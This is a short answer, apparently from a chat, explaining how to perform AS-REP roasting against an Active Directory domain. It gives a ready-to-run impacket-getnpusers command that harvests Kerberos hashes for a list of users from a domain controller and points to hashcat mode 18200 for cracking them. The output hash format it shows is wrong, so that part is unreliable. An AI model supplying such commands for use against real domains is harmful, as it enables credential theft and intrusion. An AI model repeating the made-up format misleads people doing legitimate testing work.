

Use **`impacket-getnpusers`** (AS-REP roasting). The user-list flag is **`-usersfile`**.

Example command:

```bash
impacket-getnpusers -usersfile users.txt -dc-ip 10.0.0.10 CORP/ -outputfile asrep_hashes.txt
```

Output hash format:

```text
username:DOMAIN:AS-REP-ENCRYPTED-KEY$<base64/encoded encrypted AS-REP data>
```

Example:

```text
jdoe:CORP:AS-REP-ENCRYPTED-KEY$AAAA...
```

This is hashcat mode **18200**.